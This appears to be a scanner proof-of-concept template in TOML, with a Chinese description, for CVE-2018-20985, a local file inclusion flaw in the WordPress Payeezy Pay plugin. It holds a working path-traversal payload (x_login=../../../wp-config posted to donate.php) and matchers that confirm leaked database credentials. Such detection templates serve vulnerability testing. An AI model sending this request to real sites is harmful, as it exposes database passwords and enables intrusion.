[info]
author = "AVE"
description = "检测 WordPress wp-payeezy-pay 插件 2.97 及之前版本中的本地文件包含漏洞。通过向 donate.php 发送特制 POST 请求，利用 x_login 参数进行路径遍历，读取服务器上的 wp-config.php 配置文件，获取数据库凭证等敏感信息。"
id = "POC-AVE-2018-0169"
name = "WordPress Payeezy Pay <=2.97 - Local File Inclusion PoC"
severity = "critical"
tags = [
    "cve-2018-20985",
    "lfi",
    "wordpress",
]
vuln_id = [
    "CVE-2018-20985",
    "AVE-2018-0169",
]

[poc]
logic = "all"

[[poc.requests]]
method = "POST"
path = "/{{BaseURL}}/wp-content/plugins/wp-payeezy-pay/donate.php"
protocol = "http"

[poc.requests.body]
content = "x_login=../../../wp-config"
type = "raw"

[[poc.requests.matchers]]
condition = "and"
expect = true
part = "body"
type = "word"
words = [
    "The base configuration for WordPress",
    "define( 'DB_NAME',",
    "define( 'DB_PASSWORD',",
]

[[poc.requests.matchers]]
expect = true
status = [200]
type = "status"
